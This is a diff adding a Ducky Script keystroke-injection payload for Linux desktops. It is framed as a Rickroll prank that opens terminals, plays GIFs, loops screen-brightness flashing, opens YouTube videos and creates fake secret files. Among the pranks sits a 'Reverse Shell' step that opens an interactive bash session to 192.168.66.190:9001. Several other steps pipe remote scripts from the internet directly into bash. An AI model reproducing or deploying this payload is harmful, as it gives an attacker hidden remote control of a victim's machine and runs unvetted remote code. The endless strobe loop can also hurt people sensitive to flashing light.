@@ -1,0 +1,253 @@
+DEFAULT_DELAY 500
+
+REM === Visual Effects ===
+
+REM Visual1 (GIF11)
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'mpv --title=gif11 --loop ~/Pictures/11.gif'
+ENTER
+
+DELAY 2000
+
+REM Visual2 (GIF12)
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'mpv --title=gif12 --loop ~/Pictures/12.gif'
+ENTER
+
+REM Visual3 (GIF13)
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'mpv --title=gif13 --loop ~/Pictures/13.gif'
+ENTER
+
+REM Flash Effect
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'while true; do brightnessctl set 10%; sleep 0.5; brightnessctl set 100%; sleep 0.5; done'
+ENTER
+
+REM Wallpaper Change
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING gsettings set org.gnome.desktop.background picture-uri-dark "file:///home/$USER/Pictures/rick.png"
+ENTER
+STRING bash -c "xdotool getactivewindow windowminimize"
+ENTER
+
+REM Reverse Shell (no minimize)
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'bash -i >& /dev/tcp/192.168.66.190/9001 0>&1 & disown'
+ENTER
+
+REM === ASCII Visuals ===
+
+REM Nyan
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING curl -fsSL ascii.live/nyan
+ENTER
+
+REM Pizza
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING curl -fsSL git.io/pizzzza
+ENTER
+
+REM Coffee
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING curl -fsSL git.io/coffee
+ENTER
+
+REM Forrest
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING curl -fsSL ascii.live/forrest
+ENTER
+
+REM Parrot
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING curl -fsSL ascii.live/parrot
+ENTER
+
+REM Clock
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING curl -fsSL ascii.live/clock
+ENTER
+STRING bash -c "xdotool getactivewindow windowminimize"
+ENTER
+
+REM Donut
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING curl -fsSL ascii.live/donut
+ENTER
+
+REM Audio1
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING curl -fsSL ascii.live/can-you-hear-me
+ENTER
+
+REM Shellroll
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c "$(curl -fsSL https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh)"
+ENTER
+
+REM Stream1
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING curl -sN http://rick.jachan.dev | bash
+ENTER
+
+REM Stream2
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING curl -s https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash
+ENTER
+
+REM === YouTube Rickrolls ===
+
+REM YouTube1
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'win=$(xdotool getactivewindow); xdg-open "https://www.youtube.com/watch?v=dwRxufOo3i0"; xdotool windowminimize "$win"'
+ENTER
+
+REM YouTube2
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'win=$(xdotool getactivewindow); xdg-open "https://www.youtube.com/watch?v=xvFZjo5PgG0"; xdotool windowminimize "$win"'
+ENTER
+
+REM YouTube3
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'win=$(xdotool getactivewindow); xdg-open "https://www.youtube.com/watch?v=KbHXisXdd2c"; xdotool windowminimize "$win"'
+ENTER
+
+REM YouTube4
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'win=$(xdotool getactivewindow); xdg-open "https://www.youtube.com/watch?v=PNX3r4V7dh8"; xdotool windowminimize "$win"'
+ENTER
+
+REM YouTube5
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'win=$(xdotool getactivewindow); xdg-open "https://www.youtube.com/watch?v=krudM4kHZt4"; xdotool windowminimize "$win"'
+ENTER
+
+REM YouTube6
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'win=$(xdotool getactivewindow); xdg-open "https://www.youtube.com/watch?v=h6omFJhKr6o"; xdotool windowminimize "$win"'
+ENTER
+
+REM YouTube7
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'win=$(xdotool getactivewindow); xdg-open "https://www.youtube.com/watch?v=4TOtKHI3erA"; xdotool windowminimize "$win"'
+ENTER
+
+REM YouTube8
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'win=$(xdotool getactivewindow); xdg-open "https://www.youtube.com/watch?v=waEC-8GFTP4"; xdotool windowminimize "$win"'
+ENTER
+
+REM YouTube9
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING bash -c 'win=$(xdotool getactivewindow); xdg-open "https://www.youtube.com/watch?v=SREm_0l-xwQ"; xdotool windowminimize "$win"'
+ENTER
+
+REM === Fun Text ===
+
+
+REM Lyrics
+ALT F2
+DELAY 500
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+DELAY 500
+ENTER
+DELAY 500
+STRING nano
+DELAY 500
+ENTER
+STRING Never gonna give you up
+ENTER
+STRING Never gonna let you down
+ENTER
+STRING Never gonna run around and desert you
+ENTER
+STRING Never gonna make you cry
+ENTER
+STRING Never gonna say goodbye
+ENTER
+STRING Never gonna tell a lie and hurt you
+ENTER
+CTRL X
+STRING y
+ENTER
+STRING lyrics.txt
+ENTER
+
+REM Voice Message
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING espeak-ng "You just got Rickrolled!"
+ENTER
+STRING spd-say "You just got Rickrolled!"
+ENTER
+STRING bash -c "xdotool getactivewindow windowminimize"
+ENTER
+
+REM Fake Secret Files
+ALT F2
+STRING sh -c "xdg-terminal-exec || kgx || ptyxis || gnome-terminal"
+ENTER
+STRING mkdir -p ~/Desktop/TOP_SECRET
+ENTER
+STRING cd ~/Desktop/TOP_SECRET
+ENTER
+STRING touch passwords.txt do_not_open.txt rickroll.mp4
+ENTER
+STRING for i in {1..20}; do touch "file_$i.txt"; done
+ENTER
+STRING bash -c "xdotool getactivewindow windowminimize"
+ENTER
+
